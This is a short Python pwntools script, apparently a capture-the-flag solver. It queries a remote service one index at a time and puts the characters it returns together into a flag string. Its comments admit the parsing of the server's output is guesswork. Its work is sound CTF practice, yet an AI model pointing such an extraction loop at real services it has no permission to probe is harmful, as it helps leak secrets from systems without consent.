#!/usr/bin/env python3
import sys
import re
from pwn import *

# Disable verbose pwntools logging for clean output
context.log_level = 'error'

def solve_flag(host, port):
    flag = ""
    index = 0
    print(f"[+] Connecting to target {host}:{port}...")

    # Establish a single persistent connection to avoid closing/reopening overhead and limits
    try:
        conn = remote(host, port, timeout=5)
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        return

    while True:
        try:
            # Receive until prompt appears
            conn.recvuntil(b"Enter an index:", timeout=3)
            
            # Send current index
            conn.sendline(str(index).encode())
            
            # Receive response line
            response = conn.recvline(timeout=3).decode().strip()
            
            if not response:
                break
                
            print(f"[*] Index {index} -> Response: {response}")
            
            # Extract the actual character/value, stripping out formatting like "Character at Index 0:"
            # Adjust regex or string splitting depending on the exact server output format
            # Example assumption: server returns something containing the target character at the end or after a colon
            match = re.search(r'[:=]\s*(.+)$', response)
            char = match.group(1).strip() if match else response
            
            flag += char
            index += 1
            
            # Stop if closing bracket is found
            if '}' in response or '}' in char:
                break
                
        except (EOFError, socket.timeout):
            print(f"[-] Reached end of stream or connection closed by server at index {index}.")
            break
        except Exception as e:
            print(f"[-] Error at index {index}: {e}")
            break

    try:
        conn.close()
    except:
        pass

    print(f"\n[+] Recovered Flag: {flag}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <IP> <PORT>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    solve_flag(target_ip, target_port)